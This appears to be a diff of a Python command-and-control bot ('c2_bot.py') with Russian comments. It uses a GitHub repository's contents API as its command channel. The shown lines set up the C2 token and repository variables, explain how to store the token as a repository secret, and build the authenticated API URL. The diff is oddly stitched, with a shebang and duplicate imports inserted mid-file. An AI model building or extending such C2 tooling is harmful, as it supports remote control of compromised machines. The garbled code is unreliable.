@@ -12,20 +12,43 @@ import subprocess
 from datetime import datetime
 
 # ============= КОНФИГУРАЦИЯ =============
-GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
-GITHUB_USER = os.environ.get("GITHUB_USER")
-GITHUB_REPO = os.environ.get("GITHUB_REPO")
+#!/usr/bin/env python3
+# c2_bot.py - ПОСТОЯННЫЙ ОБРАБОТЧИК КОМАНД
+# АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ
+
+import os
+import sys
+import base64
+import requests
+import subprocess
+from datetime import datetime
+
+# ============= КОНФИГУРАЦИЯ (НОВЫЕ ИМЕНА ПЕРЕМЕННЫХ) =============
+# ✅ Используем правильные имена
+GITHUB_TOKEN = os.environ.get("C2_TOKEN")        # ← ИЗМЕНЕНО!
+GITHUB_USER = os.environ.get("C2_USER")          # ← ИЗМЕНЕНО!
+GITHUB_REPO = os.environ.get("C2_REPO")          # ← ИЗМЕНЕНО!
 
 if not GITHUB_TOKEN:
-    print("❌ НЕТ TOKEN! Добавь секреты в репозиторий")
+    print("❌ НЕТ TOKEN! Добавь секрет C2_TOKEN в репозиторий")
+    print("   Settings → Secrets and variables → Actions → New repository secret")
+    print("   Name: C2_TOKEN")
+    print("   Value: ghp_твой_токен")
     sys.exit(1)
+
+if not GITHUB_USER:
+    print("❌ НЕТ USER! Проверь переменную C2_USER")
+    sys.exit(1)
+
+print(f"✅ Запуск C2 BOT")
+print(f"📁 Пользователь: {GITHUB_USER}")
+print(f"📁 Репозиторий: {GITHUB_REPO}")
 
 API_URL = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents"
 HEADERS = {
     "Authorization": f"token {GITHUB_TOKEN}",
     "Accept": "application/vnd.github.v3+json"
 }
-
 # ============= ФУНКЦИИ =============
 def log(msg):
     """Логирование с временем"""
